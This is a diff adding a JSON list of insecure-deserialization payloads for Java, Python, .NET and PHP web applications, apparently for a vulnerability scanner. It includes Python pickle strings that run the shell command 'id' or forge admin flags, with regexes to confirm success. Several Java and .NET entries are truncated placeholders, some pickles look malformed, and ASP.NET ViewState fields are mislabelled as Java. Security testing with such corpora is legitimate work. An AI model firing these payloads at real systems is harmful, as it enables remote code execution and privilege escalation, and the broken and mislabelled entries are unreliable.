@@ -1,0 +1,167 @@
+[
+  {
+    "payload_id": "OWP-0670",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Java",
+    "injection_point": "form_parameter",
+    "payload_string": "viewState=/wEy... (Java ViewState deserialization)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0672",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Python",
+    "injection_point": "form_parameter",
+    "payload_string": "c__builtins__.exec|__import__('os').system('id')",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid="
+    }
+  },
+  {
+    "payload_id": "OWP-0673",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Python",
+    "injection_point": "form_parameter",
+    "payload_string": "(dp0\\nS'is_admin'\np1\\nI01\\ns.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin"
+    }
+  },
+  {
+    "payload_id": "OWP-0674",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Python",
+    "injection_point": "form_parameter",
+    "payload_string": "cos\\nsystem\\n(S'id'\\ntR.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid="
+    }
+  },
+  {
+    "payload_id": "OWP-0675",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Python",
+    "injection_point": "form_parameter",
+    "payload_string": "gANDVGNidWlsdGlucwBzeXN0ZW0AAAAAAABsAFMpA3J0Ti4=",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0676",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": ".NET",
+    "injection_point": "form_parameter",
+    "payload_string": "__VIEWSTATE=/wEd... (YSOSerial .NET payload)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1484",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "O:14:\"ConfigParser\":2:{s:4:\"host\";s:9:\"localhost\";}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1487",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Java",
+    "injection_point": "form_parameter",
+    "payload_string": "__VIEWSTATE=.... (ViewState MAC bypass)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1488",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Java",
+    "injection_point": "form_parameter",
+    "payload_string": "__EVENTVALIDATION=.... (EventValidation deser)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1492",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Python",
+    "injection_point": "form_parameter",
+    "payload_string": "c__builtins__.eval|__import__('os').system('id')",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid="
+    }
+  },
+  {
+    "payload_id": "OWP-1493",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Python",
+    "injection_point": "form_parameter",
+    "payload_string": "c__main__.Admin\np1\n(dp2\nS'admin'\np3\nI1\ns.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1494",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": ".NET",
+    "injection_point": "form_parameter",
+    "payload_string": "__VIEWSTATE=/wEd... (ObjectStateFormatter deser)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1500",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Java",
+    "injection_point": "form_parameter",
+    "payload_string": "javax.faces.ViewState=/.... (JSF ViewState deser)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1501",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Java",
+    "injection_point": "form_parameter",
+    "payload_string": "javax.faces.source=/.... (JSF source deser)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1502",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Java",
+    "injection_point": "form_parameter",
+    "payload_string": "com.sun.faces.VIEW=/.... (Mojarra deser)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
